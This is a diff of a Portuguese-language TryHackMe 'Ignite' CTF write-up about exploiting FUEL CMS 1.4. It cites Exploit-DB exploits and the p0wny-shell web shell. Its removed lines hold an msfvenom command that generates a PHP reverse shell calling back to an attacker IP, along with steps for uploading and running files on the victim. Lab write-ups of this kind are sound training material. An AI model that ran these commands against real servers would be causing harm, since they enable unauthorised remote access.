@@ -138,41 +138,6 @@ ________________________________________________
 ```
 
 ```
-Essas rotas não me trouxeram nada promissor, então só me resta pesquisar se existe algum CVE que faça o exploit do FUEL CMS na versão 1.4: https://www.exploit-db.com/exploits/50477 Baixando o arquivo .py e rodando e colocando os argumentos necessários consegui atacar o alvo e acessar um terminal que não é 100% iterativo, não consigo sair da pasta do servidor apache (usar o comando cd), então provavelmente temos que subir algum arquivo malicioso no servidor e executar chamando a rota do arquivo. (forçando o servidor a rodar o arquivo.) vou tentar com um arquivo .sh primeiro.
+Essas rotas não me trouxeram nada promissor, então só me resta pesquisar se existe algum CVE que faça o exploit do FUEL CMS na versão 1.4: https://www.exploit-db.com/exploits/50477 Baixando o arquivo .py e rodando e colocando os argumentos necessários consegui atacar o alvo e acessar um terminal que não é 100% iterativo, não consigo sair da pasta do servidor apache (usar o comando cd), então provavelmente temos que subir algum arquivo malicioso no servidor e executar chamando a rota do arquivo. (forçando o servidor a rodar o arquivo.) Vou testar fazer upload disso no servidor: https://github.com/flozz/p0wny-shell isso irá abrir um shell na rota do arquivo do server. Infelizmente esse CVE está travando demais a conexão. vou tentar esse outro https://www.exploit-db.com/exploits/47138. Esse último é necessário editar um pouco o arquivo, removendo o proxy inteiro e mudando a url de ataque. 
 ```
 
-vou subir o apache na minha máquina para servir arquivos
-```
-sudo systemctl start apache2
-```
-
-agora vou entrar em /var/www/html e vou criar o arquivo usando nano teste.sh
-```
-nano teste.sh
-#!/bin/bash
-echo "Hello, World!"
-```
-
-agora vou entrar na máquina vítima e dar um wget no meu ip / esse arquivo. ./teste.sh não rodou. vou testar com um arquivo php afinal de contas o servidor dele roda em cima de wordpress. Ok, como eu estou mandando comandos remotos talvez eu não tenha permissão para executar nada porém o servidor provavelmente tem permissão maior que eu. Se eu forçar o servidor a executar o arquivo eu posso logar com permissão maior. O servidor é wordpress logo ele executa PHP. Ele só não executou meu script com o comando remoto pois eu não tinha permissão olhe o print:
-
-![alt text](assets/images/tryhackme/ignite/image6.png)
-
-Então vou forçar rodar o arquivo chamando o arquivo através do meu navegador. Observe os dois próximos prints:
-
-![alt text](assets/images/tryhackme/ignite/image7.png)
-
-O servidor não executou o print acima. Acredito que nem faça sentido executar pois é wordpress, php etc...
-
-Agora o arquivo em php ele executou:
-
-![alt text](assets/images/tryhackme/ignite/image8.png)
-
-Então vamos criar uma reverse shell utilizando PHP para que eu possa ter um cmd melhor. Vou usar o comando para gerar o código php: (peguei desse site: https://www.revshells.com/)
-
-```
-msfvenom -p php/reverse_php LHOST=10.8.18.71 LPORT=4242 -o shell.php
-```
-
-![alt text](assets/images/tryhackme/ignite/image9.png)
-
-Engraçado, nem precisei chamar no navegador o arquivo para executar. Talvez o código gerado pelo msfvenom já se auto execute ao entrar.
